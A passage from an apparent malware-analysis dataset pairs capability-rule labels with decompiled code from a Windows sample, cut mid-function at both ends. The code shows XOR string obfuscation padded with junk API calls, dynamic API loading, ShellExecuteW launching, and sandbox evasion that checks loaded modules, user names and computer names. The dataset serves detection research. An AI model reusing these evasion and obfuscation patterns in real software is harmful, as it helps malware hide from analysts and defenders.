0x774c766c;\n        var_20h._0_1_ = 0x72;\n        var_14h = param_2;\n        fcn.00401000(10);\n        iVar6 = var_8h;\n        iVar10 = 0;\n        var_10h = 5;\n        iVar7 = &var_34h - var_8h;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar3 != 0x50efc5) {\n                *(iVar10 + iVar6) = *(&var_24h + iVar10 % var_10h) ^ (iVar10 + iVar6)[iVar7];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_34h = 0x27032c3b;\n        var_30h = 0x352c1600;\n        var_2ch._0_2_ = 0x307;\n        var_2ch._2_1_ = 0x77;\n        var_24h = 0x6b714877;\n        var_20h._0_1_ = 0x6f;\n        fcn.00401000(0xb);\n        iVar6 = var_18h;\n        iVar10 = 0;\n        iVar7 = &var_34h - var_18h;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar3 = var_8h;\n            if (iVar4 != 0x21a996) {\n                *(iVar10 + iVar6) = *(&var_24h + iVar10 % var_10h) ^ (iVar10 + iVar6)[iVar7];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0xb);\n        *0x41cd80 = fcn.0040ab39(iVar6);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41cd80 == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = (*pcVar8)(0, iVar3);\n            (*pcVar2)(uVar5);\n            goto code_r0x00407b2d;\n        }\n        var_24h = 6;\n        var_4ch = 0x223b013c;\n        var_48h = 0x17202112;\n        _var_44h = 0x31120626;\n        stack0xffffffbc = 0x242c1705;\n        _var_3ch = 0x23113;\n        var_3bh._3_1_ = 0x3a;\n        var_37h = 0x16;\n        var_36h = 0x77;\n        var_30h = 0x65496570;\n        var_2ch._0_2_ = 0x5577;\n        fcn.00401000(0x17);\n        iVar6 = var_ch;\n        iVar10 = 0;\n        iVar7 = &var_4ch - var_ch;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n            iVar3 = var_8h;\n            if (iVar4 != 0x9e684a) {\n                puVar1 = iVar10 + iVar6;\n                *puVar1 = *(&var_30h + iVar10 % var_24h) ^ puVar1[iVar7];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0x17);\n        *0x41cd88 = fcn.0040ab39(iVar6);\n        if (*0x41cd88 == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            var_8h = iVar3;\n        }\n        else {\n            var_4ch = 0x31122613;\n            var_48h = 0x21343d3b;\n            _var_44h = 0x23200237;\n            stack0xffffffbc = 0x25353636;\n            _var_3ch = 0x3b2e271c;\n            var_3bh._3_1_ = 0x3b;\n            var_37h = 0x28;\n            var_36h = 0x42;\n            var_30h = 0x43425149;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x54);\n            fcn.00401000(0x17);\n            iVar6 = var_1ch;\n            iVar10 = 0;\n            iVar7 = &var_4ch - var_1ch;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                if (iVar3 != 0x31dc9c) {\n                    puVar1 = iVar10 + iVar6;\n                    *puVar1 = *(&var_30h + iVar10 % var_10h) ^ puVar1[iVar7];\n                }\n                iVar10 = iVar10 + 1;\n            } while (iVar10 < 0x17);\n            *0x41cd90 = fcn.0040ab39(iVar6);\n            if (*0x41cd90 != 0) {\n                var_4h = 0;\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                (*pcVar8)(uVar5);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                (*pcVar8)(uVar5);\n                uVar5 = (*pcVar2)(0, var_8h);\n                (*pcVar8)(uVar5);\n                goto code_r0x00407b20;\n            }\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        }\n        (*pcVar8)(uVar5);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n        (*pcVar8)(uVar5);\n        uVar5 = (*pcVar2)(0, var_8h);\n        (*pcVar8)(uVar5);\n    }\n    else {\ncode_r0x00407b20:\n        puVar9 = 0x41cd80;\n        for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *var_28h = *puVar9;\n            puVar9 = puVar9 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\ncode_r0x00407b2d:\n    *0x41cd94 = *0x41cd90 >> 0x20;\n    *0x41cd8c = *0x41cd88 >> 0x20;\n    *0x41cd84 = *0x41cd80 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2177
    },
    "00409116": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00409116(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    code *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    iVar5 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (var_ch = param_1[1],  var_ch != NULL)) {\n        if (*param_1 == *var_ch) {\n            var_3ch = 0x3c0024;\n            var_38h = 0x3d1b152c;\n            var_34h = 0x7133b34;\n            var_30h = 0x103c0623;\n            var_2ch = 0x49363512;\n            var_18h = 0x44507476;\n            var_14h._0_1_ = 0x49;\n            var_20h = param_2;\n            var_1ch = param_1;\n            fcn.00401000(0x14);\n            iVar5 = var_8h;\n            iVar7 = 0;\n            var_4h = 5;\n            iVar6 = &var_3ch - var_8h;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                if (iVar3 != 0xf526a2) {\n                    *(iVar7 + iVar5) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar5)[iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x14);\n            var_34h = 0x1b280202;\n            var_30h = 0x2012421e;\n            var_2ch = CONCAT22(var_2ch._2_2_, 0x721b);\n            var_28h = 0x774c766c;\n            var_24h._0_1_ = 0x72;\n            fcn.00401000(10);\n            iVar6 = var_18h;\n            iVar7 = 0;\n            iVar5 = &var_34h - var_18h;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar3 != 0x50efc5) {\n                    *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_4h) ^ (iVar7 + iVar6)[iVar5];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 10);\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar6, var_8h);\n            var_18h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n            piVar2 = var_ch;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch[1]);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar5 = *piVar2;\n            var_1ch = var_1ch[1] + 0xc;\n            fcn.0040907b();\n            piVar2 = var_ch;\n            iVar5 = (*var_18h)(2, var_4h, var_ch[1], var_1ch, iVar5 + -0xc, &var_10h);\n            var_ch = iVar5;\n            if (iVar5 == 0) {\n                if (var_10h == piVar2[1]) {\n                    var_20h[1] = var_4h;\n                    *var_20h = var_10h;\n                }\n                else {\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    iVar5 = -0x3fffff85;\n                }\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = (*pcVar1)(0, var_8h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            iVar5 = -0x3fffff85;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1183
    },
    "0040a64b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040a64b(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    if ((*0x41cdb8 | *0x41cdbc) != 0) {\ncode_r0x0040a9e4:\n        var_10h = 0x41cdb8;\n        goto code_r0x0040a9e9;\n    }\n    var_30h = 0x1b280202;\n    var_2ch = 0x2012421e;\n    var_28h._0_2_ = 0x721b;\n    var_24h = 0x774c766c;\n    var_20h._0_1_ = 0x72;\n    fcn.00401000(10);\n    iVar2 = var_4h;\n    iVar8 = 0;\n    var_18h = 5;\n    iVar6 = &var_30h - var_4h;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x50efc5) {\n            *(iVar8 + iVar2) = *(&var_24h + iVar8 % var_18h) ^ (iVar8 + iVar2)[iVar6];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_48h = 0x311d130d;\n    var_44h._0_2_ = 0xf46;\n    var_44h._2_1_ = 0x38;\n    stack0xffffffbb = 0x4a312e0a;\n    stack0xffffffbf = 0x280c0338;\n    var_3ch._3_1_ = 0x31;\n    var_38h._0_2_ = 0x2853;\n    var_38h._2_1_ = 0x57;\n    var_2ch = 0x545a6457;\n    var_28h._0_2_ = 0x4c32;\n    fcn.00401000(0x13);\n    iVar2 = var_ch;\n    iVar8 = 0;\n    var_1ch = 6;\n    iVar6 = &var_48h - var_ch;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        iVar3 = var_4h;\n        if (iVar4 != 0x924be) {\n            *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_1ch) ^ (iVar8 + iVar2)[iVar6];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x13);\n    *0x41cdb8 = fcn.0040ab39(iVar2);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cdb8 == 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        var_4h = iVar3;\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x0040a76b:\n        (*pcVar9)(uVar5);\n        uVar5 = (*pcVar7)(0, var_4h);\n        (*pcVar9)(uVar5);\n    }\n    else {\n        var_48h = 0xd20210c;\n        var_44h._0_2_ = 0x154c;\n        var_44h._2_1_ = 0x39;\n        stack0xffffffbb = 0x2e5d1c1d;\n        stack0xffffffbf = 0x4a002722;\n        var_3ch._3_1_ = 0x33;\n        var_38h._0_2_ = 0x1737;\n        var_38h._2_1_ = 0x68;\n        var_24h = 0x68735656;\n        var_20h._0_1_ = 0x38;\n        fcn.00401000(0x13);\n        iVar2 = var_8h;\n        iVar8 = 0;\n        iVar6 = &var_48h - var_8h;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n            iVar3 = var_4h;\n            if (iVar4 != 0xc8b2a) {\n                puVar1 = iVar8 + iVar2;\n                *puVar1 = *(&var_24h + iVar8 % var_18h) ^ puVar1[iVar6];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x13);\n        *0x41cdc0 = fcn.0040ab39(iVar2);\n        if (*0x41cdc0 == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0xb7b446e;\n            var_44h._0_2_ = 0x6248;\n            var_44h._2_1_ = 0x5a;\n            stack0xffffffbb = 0x52771d53;\n            stack0xffffffbf = 0x4c095360;\n            var_3ch._3_1_ = 0x5d;\n            var_38h._0_2_ = 0x585c;\n            var_38h._2_1_ = 0x6a;\n            var_2ch = 0x6a363334;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x38);\n            fcn.00401000(0x13);\n            iVar2 = var_14h;\n            iVar8 = 0;\n            iVar6 = &var_48h - var_14h;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n                iVar3 = var_4h;\n                if (iVar4 != 0xf0c037) {\n                    puVar1 = iVar8 + iVar2;\n                    *puVar1 = *(&var_2ch + iVar8 % var_18h) ^ puVar1[iVar6];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x13);\n            *0x41cdc8 = fcn.0040ab39(iVar2);\n            if (*0x41cdc8 != 0) {\n                var_48h = 0x3c2c342c;\n                var_44h._0_2_ = 800;\n                var_44h._2_1_ = 6;\n                stack0xffffffbb = 0x3a371015;\n                stack0xffffffbf = 0x1c10102d;\n                var_3ch._3_1_ = 0x31;\n                var_38h._0_2_ = 0xb39;\n                var_38h._2_1_ = 0x19;\n                stack0xffffffc7 = 0x792d;\n                var_2ch = 0x52794376;\n                var_28h._0_2_ = 0x624d;\n                fcn.00401000(0x15);\n                iVar2 = var_24h;\n                iVar8 = 0;\n                iVar6 = &var_48h - var_24h;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                    if (iVar3 != 0xae9132) {\n                        *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_1ch) ^ (iVar8 + iVar2)[iVar6];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x15);\n                *0x41cdd0 = fcn.0040ab39(iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (*0x41cdd0 != 0) {\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    uVar5 = (*pcVar7)(0, var_14h);\n                    (*pcVar9)(uVar5);\n                    uVar5 = (*pcVar7)(0, var_8h);\n                    (*pcVar9)(uVar5);\n                    uVar5 = (*pcVar7)(0, var_ch);\n                    (*pcVar9)(uVar5);\n                    uVar5 = (*pcVar7)(0, var_4h);\n                    (*pcVar9)(uVar5);\n                    goto code_r0x0040a9e4;\n                }\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                uVar5 = (*pcVar7)(0, var_14h);\n                (*pcVar9)(uVar5);\n                uVar5 = (*pcVar7)(0, var_8h);\n                (*pcVar9)(uVar5);\n                uVar5 = (*pcVar7)(0, var_ch);\n                goto code_r0x0040a76b;\n            }\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        }\n        (*pcVar7)(uVar5);\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        (*pcVar7)(uVar5);\n        uVar5 = (*pcVar9)(0, iVar3);\n        (*pcVar7)(uVar5);\n    }\ncode_r0x0040a9e9:\n    *0x41cdcc = *0x41cdc8 >> 0x20;\n    *0x41cdd4 = *0x41cdd0 >> 0x20;\n    *0x41cdc4 = *0x41cdc0 >> 0x20;\n    *0x41cdbc = *0x41cdb8 >> 0x20;\n    return var_10h;\n}\n",
        "token_count": 2612
    },
    "0040acb9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040acb9(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_24h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h;\n    uint lpFile;\n    uint lpParameters;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h._0_2_ = 0x515b;\n    var_8h = 6;\n    var_24h._2_1_ = 6;\n    stack0xffffffdb = 0x5a62266a;\n    var_1dh._0_2_ = 0x7651;\n    var_1dh._2_1_ = 0x6a;\n    var_18h = 0x6a765134;\n    var_14h._0_2_ = 0x6243;\n    lpParameters = param_2;\n    fcn.00401000(0x14);\n    iVar4 = 0;\n    do {\n        iVar1 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar1 != 0x9b299a) {\n            *(iVar4 + var_4h) = *(&var_18h + iVar4 % var_8h) ^ (iVar4 + var_4h)[&var_24h - var_4h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 10);\n    uVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, var_4h, lpFile, lpParameters, 0, 0);\n    if (0x20 < uVar2) {\n        uVar2 = 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 475
    },
    "0040dede": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040dede(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint pcbBuffer;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    ushort uStack52;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0040dd1a();\n    if (iVar4 != 0) {\n        fcn.0040dec6();\n    }\n    stack0xffffffe7 = CONCAT31(0x32233d, var_18h._3_1_);\n    stack0xffffffeb = 0x29553650;\n    var_10h._3_1_ = 0x6f;\n    var_ch._0_1_ = 0x31;\n    var_ch._1_1_ = 0x54;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x39;\n    var_8h = 0x38554159;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x39;\n    fcn.00401000(0xc);\n    iVar4 = 0;\n    var_2ch = 6;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar5 != 0xfcfafd) {\n            *(iVar4 + var_98h) = *(&var_8h + iVar4 % var_2ch) ^ (iVar4 + var_98h)[&var_14h - var_98h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_98h);\n    if (iVar4 != 0) {\n        fcn.0040dec6();\n    }\n    stack0xffffffe7 = stack0xffffffe7 & 0xff | 0x2e2e4000;\n    stack0xffffffeb = 0x5f3f2f03;\n    var_10h._3_1_ = 0x62;\n    var_ch._0_1_ = 0x23;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x53;\n    var_8h = 0x66474c33;\n    var_4h._0_1_ = 0x4b;\n    var_4h._1_1_ = 0x53;\n    fcn.00401000(0xc);\n    iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar5 != 0xaf4d90) {\n            *(iVar4 + var_a4h) = *(&var_8h + iVar4 % var_2ch) ^ (iVar4 + var_a4h)[&var_14h - var_a4h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_a4h);\n    if (iVar4 != 0) {\n        fcn.0040dec6();\n    }\n    pcbBuffer = 0x400;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41ce10, &pcbBuffer);\n    if (iVar4 == 0) {\n        fcn.0040dec6();\n    }\n    stack0xffffffe7 = stack0xffffffe7 & 0xff | 0x25420e00;\n    stack0xffffffeb = 0x43232917;\n    var_10h._3_1_ = 2;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x29;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x37;\n    var_8h = 0x6557374d;\n    var_4h._0_1_ = 0x4c;\n    fcn.00401000(0xc);\n    iVar4 = 0;\n    var_5ch = 5;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar5 != 0x5d35) {\n            *(iVar4 + var_ach) = *(&var_8h + iVar4 % var_5ch) ^ (iVar4 + var_ach)[&var_14h - var_ach];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ce10, var_ach);\n    if (iVar4 == 0) {\n        fcn.0040dec6();\n    }\n    stack0xffffffeb = stack0xffffffeb & 0xff | 0x26503a00;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0xe;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x11;\n    var_ch._3_1_ = 0x31;\n    var_8h = 0x42483169;\n    var_4h._0_1_ = 0x6c;\n    var_4h._1_1_ = 0x77;\n    fcn.00401000(8);\n    iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar5 != 0x709877) {\n            *(iVar4 + var_9ch) = *(&var_8h + iVar4 % var_2ch) ^ (iVar4 + var_9ch)[&var_10h - var_9ch];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ce10, var_9ch);\n    if (iVar4 == 0) {\n        fcn.0040dec6();\n    }\n    pcbBuffer = 0x400;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41ce10, &pcbBuffer);\n    if (iVar4 == 0) {\n        fcn.0040dec6();\n    }\n    stack0xffffffeb = stack0xffffffeb & 0xff | 0x1b0e6b00;\n    var_10h._3_1_ = 0x2a;\n    var_ch._0_1_ = 0x27;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0x60;\n    var_ch._3_1_ = 0x4f;\n    var_8h = 0x6e554f38;\n    var_4h._0_1_ = 0x65;\n    var_4h._1_1_ = 0x79;\n    fcn.00401000(8);\n    iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar5 != 0x328f50) {\n            *(iVar4 + var_b0h) = *(&var_8h + iVar4 % var_2ch) ^ (iVar4 + var_b0h)[&var_10h - var_b0h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ce10, var_b0h);\n    if (iVar4 == 0) {\n        fcn.0040dec6();\n    }\n    stack0xffffffeb = stack0xffffffeb & 0xff | 0x19635d00;\n    var_10h._3_1_ = 0x1b;\n    var_ch._0_1_ = 5;\n    var_ch._1_1_ = 0x7e;\n    var_ch._2_1_ = 0x2b;\n    var_ch._3_1_ = 0x30;\n    var_8h = 0x5750306a;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x37;\n    fcn.00401000(8);\n    iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar5 != 0xc8adc1) {\n            *(iVar4 + var_a8h) = *(&var_8h + iVar4 % var_2ch) ^ (iVar4 + var_a8h)[&var_10h - var_a8h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ce10, var_a8h);\n    if (iVar4 == 0) {\n        fcn.0040dec6();\n    }\n    var_4ch = 0x35640d10;\n    var_48h = 0x731e1912;\n    var_44h._0_1_ = 0x2d;\n    var_44h._1_1_ = 1;\n    var_44h._2_2_ = 0x1f1d;\n    var_40h._0_2_ = 0x2375;\n    var_40h._2_2_ = 0x80c;\n    var_3ch._0_2_ = 0x7f18;\n    var_3ch._2_2_ = 0xb3e;\n    var_38h._0_2_ = 0x1f04;\n    var_38h._2_2_ = 0x24f;\n    var_34h._0_2_ = 0x3d31;\n    var_34h._2_2_ = 0x3621;\n    var_8h = 0x71364c58;\n    var_4h._0_1_ = 0x45;\n    fcn.00401000(0x1c);\n    iVar4 = var_6ch;\n    iVar9 = 0;\n    iVar5 = &var_4ch - var_6ch;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0x9363c5) {\n            *(iVar9 + iVar4) = *(&var_8h + iVar9 % var_5ch) ^ (iVar9 + iVar4)[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x1c);\n    var_1ch._0_2_ = 0x4e1d;\n    var_1ch._2_1_ = 0x1f;\n    var_1ch._3_1_ = 0x35;\n    var_18h._0_2_ = 0x233f;\n    var_18h._2_1_ = 0x75;\n    stack0xffffffe7 = 0x18292e05;\n    stack0xffffffeb = 0x33321e52;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0x59;\n    var_ch._1_1_ = 0x6c;\n    var_8h = 0x416c374e;\n    var_4h._0_1_ = 0x5a;\n    fcn.00401000(0x12);\n    iVar4 = var_7ch;\n    iVar9 = 0;\n    iVar5 = &var_1ch - var_7ch;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        puVar8 = extraout_ECX;\n        if (iVar6 != 0xceae10) {\n            puVar8 = iVar9 + iVar4;\n            *puVar8 = *(&var_8h + iVar9 % var_5ch) ^ puVar8[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x12);\n    cVar3 = fcn.0040dcbe(puVar8, puVar8);\n    if (cVar3 == '\\0') {\n        fcn.0040dec6();\n    }\n    var_8h = 0x65130f15;\n    var_4h._0_1_ = 0x55;\n    var_28h = 0x455a4254;\n    var_24h._0_2_ = 0x4c55;\n    fcn.00401000(5);\n    iVar4 = var_84h;\n    iVar9 = 0;\n    iVar5 = &var_8h - var_84h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0x727d48) {\n            *(iVar9 + iVar4) = *(&var_28h + iVar9 % var_2ch) ^ (iVar9 + iVar4)[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 5);\n    var_8h = 0x70002206;\n    var_4h._0_1_ = 100;\n    var_4h._1_1_ = 0x52;\n    var_28h = 0x38436d44;\n    var_24h._0_2_ = 0x5237;\n    fcn.00401000(6);\n    